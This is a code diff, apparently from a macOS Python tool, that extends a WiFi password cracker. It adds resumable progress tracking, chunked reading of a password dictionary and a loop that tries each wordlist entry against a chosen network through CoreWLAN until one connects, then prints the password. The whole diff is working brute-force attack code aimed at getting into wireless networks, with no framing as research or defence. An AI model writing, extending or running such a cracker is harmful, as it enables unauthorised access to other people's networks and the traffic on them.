@@ -7,11 +7,204 @@ import json
 import socket
 import Foundation
 import logging
-from typing import List, Dict, Optional
+import hashlib
+from typing import List, Dict, Optional, Generator
 from prettytable import PrettyTable
 from time import sleep
 import pyfiglet
 from Cocoa import NSApplication
+import threading
+import queue
+import psutil
+
+class WifiCrackProgress:
+    """
+    进度追踪和管理类
+    """
+    def __init__(self, total_passwords: int, config_dir: str):
+        """
+        初始化进度追踪
+        
+        :param total_passwords: 密码总数
+        :param config_dir: 配置目录
+        """
+        self.total_passwords = total_passwords
+        self.current_index = 0
+        self.progress_file = os.path.join(config_dir, 'crack_progress.json')
+        self.lock = threading.Lock()
+        
+    def load_progress(self) -> int:
+        """
+        加载上次的进度
+        
+        :return: 上次中断的密码索引
+        """
+        try:
+            if os.path.exists(self.progress_file):
+                with open(self.progress_file, 'r') as f:
+                    progress_data = json.load(f)
+                    return progress_data.get('current_index', 0)
+        except Exception as e:
+            print(f"加载进度文件错误: {e}")
+        return 0
+    
+    def save_progress(self, current_index: int):
+        """
+        保存当前进度
+        
+        :param current_index: 当前密码索引
+        """
+        with self.lock:
+            try:
+                progress_data = {
+                    'current_index': current_index,
+                    'total_passwords': self.total_passwords,
+                    'timestamp': os.times().system
+                }
+                with open(self.progress_file, 'w') as f:
+                    json.dump(progress_data, f, indent=4)
+            except Exception as e:
+                print(f"保存进度文件错误: {e}")
+    
+    def update_progress(self, increment=1):
+        """
+        更新进度
+        
+        :param increment: 进度增量
+        """
+        with self.lock:
+            self.current_index += increment
+            percentage = (self.current_index / self.total_passwords) * 100
+            print(f"\r进度: {self.current_index}/{self.total_passwords} ({percentage:.2f}%)", end='', flush=True)
+            
+            # 每隔一定间隔保存进度
+            if self.current_index % 50 == 0:
+                self.save_progress(self.current_index)
+
+class MemoryEfficientPasswordReader:
+    """
+    内存高效的密码读取器
+    支持分块读取、断点续传
+    """
+    def __init__(self, pwd_dict_path: str, max_memory_mb: int = 50, start_index: int = 0):
+        """
+        初始化密码读取器
+        
+        :param pwd_dict_path: 密码字典路径
+        :param max_memory_mb: 最大内存限制（MB）
+        :param start_index: 起始索引
+        """
+        self.pwd_dict_path = pwd_dict_path
+        self.max_memory_bytes = max_memory_mb * 1024 * 1024
+        self.start_index = start_index
+    
+    def read_passwords(self) -> Generator[str, None, None]:
+        """
+        生成器方式读取密码，控制内存占用
+        
+        :yield: 密码
+        """
+        with open(self.pwd_dict_path, 'r', encoding='utf-8') as file:
+            # 跳过已处理的密码
+            for _ in range(self.start_index):
+                file.readline()
+            
+            current_block = []
+            current_size = 0
+            
+            for line in file:
+                password = line.strip()
+                if not password:
+                    continue
+                
+                # 检查内存占用
+                current_size += sys.getsizeof(password)
+                current_block.append(password)
+                
+                # 如果内存超过限制，yield并清空
+                if current_size >= self.max_memory_bytes:
+                    yield from current_block
+                    current_block = []
+                    current_size = 0
+            
+            # 处理剩余密码
+            yield from current_block
+
+def wifi_connect_with_password_dict(
+    cwlan_interface, 
+    network, 
+    pwd_dict_path, 
+    config_dir,
+    max_memory_mb=50,
+    logger=None
+) -> Optional[str]:
+    """
+    WiFi密码破解函数，支持进度追踪和内存控制
+    
+    :param cwlan_interface: WiFi接口
+    :param network: 目标网络
+    :param pwd_dict_path: 密码字典路径
+    :param config_dir: 配置目录
+    :param max_memory_mb: 最大内存限制
+    :param logger: 日志记录器
+    
+    :return: 成功的密码
+    """
+    logger = logger or logging.getLogger(__name__)
+    logger.info(f"开始破解网络: {network['ssid']}")
+    
+    # 扫描网络
+    scan_results, _ = cwlan_interface.scanForNetworksWithName_error_(network['ssid'], None)
+    
+    if not scan_results:
+        logger.error(f"未找到网络: {network['ssid']}")
+        return None
+    
+    network_obj = scan_results.anyObject()
+    
+    if not network_obj:
+        logger.error(f"无法获取网络对象: {network['ssid']}")
+        return None
+    
+    # 准备进度追踪
+    total_passwords = sum(1 for _ in open(pwd_dict_path, 'r', encoding='utf-8'))
+    progress_tracker = WifiCrackProgress(total_passwords, config_dir)
+    
+    # 加载上次进度
+    start_index = progress_tracker.load_progress()
+    logger.info(f"从索引 {start_index} 开始破解")
+    
+    # 内存高效密码读取器
+    password_reader = MemoryEfficientPasswordReader(
+        pwd_dict_path, 
+        max_memory_mb=max_memory_mb, 
+        start_index=start_index
+    )
+    
+    for password in password_reader.read_passwords():
+        try:
+            # 尝试连接
+            if connect_to_wifi(cwlan_interface, network_obj, password, logger=logger):
+                if verify_internet_connection(logger=logger):
+                    logger.info(f"成功连接网络: {network['ssid']}")
+                    return password
+            
+            # 更新进度
+            progress_tracker.update_progress()
+        
+        except KeyboardInterrupt:
+            # 处理中断
+            progress_tracker.save_progress(progress_tracker.current_index)
+            print("\n已保存进度，可以下次继续...")
+            return None
+        
+        except Exception as e:
+            logger.error(f"破解过程发生错误: {e}")
+    
+    logger.warning("无法使用密码字典连接网络")
+    return None
+
+
 
 class WifiCrackLogger:
     """
@@ -161,7 +354,7 @@ def connect_to_wifi(cwlan_interface, network, password, timeout=10, logger=None)
 
         if response[0]:
             # 等待连接建立
-            print("✅成功连接到网络网络! ⌛️等待系统建立链接...")
+            print(f"\n✅成功连接到网络! ⌛️等待系统建立链接...")
             print(f"网络: {network.ssid()} 密码: {password}")
             logger.info(f"成功连接到网络: {network.ssid()}")
             sleep(3)  # 给系统一些时间建立连接
@@ -198,52 +391,52 @@ def verify_internet_connection(timeout: int = 10, logger=None) -> bool:
     
     return False
 
-def wifi_connect_with_password_dict(cwlan_interface, network, pwd_dict_data, logger=None) -> Optional[str]:
-    """
-    尝试通过密码字典中的密码连接到WiFi网络。
+# def wifi_connect_with_password_dict(cwlan_interface, network, pwd_dict_data, logger=None) -> Optional[str]:
+#     """
+#     尝试通过密码字典中的密码连接到WiFi网络。
     
-    参数:
-        cwlan_interface: CoreWLAN 接口对象
-        network (dict): 网络扫描结果中的网络信息
-        pwd_dict_data (list): 要尝试的密码列表
+#     参数:
+#         cwlan_interface: CoreWLAN 接口对象
+#         network (dict): 网络扫描结果中的网络信息
+#         pwd_dict_data (list): 要尝试的密码列表
     
-    返回:
-        str or None: 成功连接的密码，如果连接失败返回None
-    """
-    logger = logger or logging.getLogger(__name__)
-    logger.info(f"开始尝试破解网络: {network['ssid']}")
+#     返回:
+#         str or None: 成功连接的密码，如果连接失败返回None
+#     """
+#     logger = logger or logging.getLogger(__name__)
+#     logger.info(f"开始尝试破解网络: {network['ssid']}")
     
-    scan_results, _ = cwlan_interface.scanForNetworksWithName_error_(network['ssid'], None)
+#     scan_results, _ = cwlan_interface.scanForNetworksWithName_error_(network['ssid'], None)
     
-    if not scan_results:
-        logger.error(f"未找到网络: {network['ssid']}")
-        return None
+#     if not scan_results:
+#         logger.error(f"未找到网络: {network['ssid']}")
+#         return None
     
-    network_obj = scan_results.anyObject()
+#     network_obj = scan_results.anyObject()
     
-    if not network_obj:
-        logger.error(f"无法获取网络对象: {network['ssid']}")
-        return None
+#     if not network_obj:
+#         logger.error(f"无法获取网络对象: {network['ssid']}")
+#         return None
     
-    # 使用生成器和集合减少内存消耗
-    tried_passwords = set()
+#     # 使用生成器和集合减少内存消耗
+#     tried_passwords = set()
     
-    for password in pwd_dict_data:
-        if password in tried_passwords:
-            continue
+#     for password in pwd_dict_data:
+#         if password in tried_passwords:
+#             continue
         
-        tried_passwords.add(password)
+#         tried_passwords.add(password)
         
-        # 内联日志输出
-        logger.debug(f"正在尝试密码: {password}")
+#         # 内联日志输出
+#         logger.debug(f"正在尝试密码: {password}")
         
-        if connect_to_wifi(cwlan_interface, network_obj, password, logger=logger):
-            if verify_internet_connection(logger=logger):
-                logger.info(f"成功连接并验证互联网: {network['ssid']}")
-                return password
+#         if connect_to_wifi(cwlan_interface, network_obj, password, logger=logger):
+#             if verify_internet_connection(logger=logger):
+#                 logger.info(f"成功连接并验证互联网: {network['ssid']}")
+#                 return password
     
-    logger.error("无法使用给定的密码字典连接网络")
-    return None
+#     logger.error("无法使用给定的密码字典连接网络")
+#     return None
 
 
 def load_or_create_config(config_file_path=None, config_settings_data=None):
@@ -330,6 +523,8 @@ def main():
         # 'scan_time': 8, # 暂时没吊用
         # 'connect_time': 3, # 暂时没吊用
         'pwd_txt_path': os.path.join(base_dir, 'passwords.txt'),
+        'max_memory_mb': 50,   # 默认最大内存
+        # 'progress_save_interval': 50,  # 进度保存间隔 # 暂时没吊用
         'log_level': 'INFO'  # 默认日志等级
     }
 
@@ -347,9 +542,9 @@ def main():
     print(f"当前日志级别: {log_level}")
 
     # 加载密码字典
-    print('开始加载密码字典...')
-    pwd_dict_data = load_pwd_dict(config['pwd_txt_path'])
-    print(f'加载完成！共 {len(pwd_dict_data)} 个密码')
+    # print('开始加载密码字典...')
+    # pwd_dict_data = load_pwd_dict(config['pwd_txt_path'])
+    # print(f'加载完成！共 {len(pwd_dict_data)} 个密码')
 
     # 获取默认 WiFi 接口
     cwlan_client = CoreWLAN.CWWiFiClient.sharedWiFiClient()
@@ -379,7 +574,9 @@ def main():
     connected_password = wifi_connect_with_password_dict(
         cwlan_interface, 
         selected_network, 
-        pwd_dict_data,
+        config['pwd_txt_path'], # pwd_dict_data,
+        config_dir,
+        config['max_memory_mb'],
         logger
     )
     
